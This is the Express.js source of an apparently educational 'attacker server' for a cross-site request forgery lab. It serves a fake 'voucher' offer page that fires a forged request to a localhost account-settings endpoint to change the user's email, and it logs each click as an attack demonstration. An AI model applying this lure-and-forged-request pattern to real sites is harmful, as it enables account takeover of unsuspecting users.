const express = require('express');
const path = require('path');

const app = express();
const PORT = 4000;

const TARGET_URL = 'http://localhost:3000/settings/update-email?email=forged@example.test';

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.json());
app.use(express.static(path.join(__dirname, '..', 'public')));

app.get('/', (req, res) => {
  res.render('voucher', { targetUrl: TARGET_URL });
});

app.post('/log-click', (req, res) => {
  console.log('='.repeat(50));
  console.log('[ATTACK DEMONSTRATION]');
  console.log(`Time: ${new Date().toISOString()}`);
  console.log('Event: Claim Offer clicked');
  console.log('Method: GET');
  console.log(`Target: ${TARGET_URL.split('?')[0]}`);
  console.log('Purpose: Demonstrate a forged account-update request');
  console.log('Result: Attack request initiated');
  console.log('='.repeat(50));
  res.sendStatus(204);
});

app.use((req, res) => {
  console.log(`[ATTACKER SERVER] 404 - ${req.method} ${req.path}`);
  res.status(404).send('Not found');
});

app.listen(PORT, '127.0.0.1', () => {
  console.log(`[ATTACKER SERVER] Running at http://127.0.0.1:${PORT}`);
});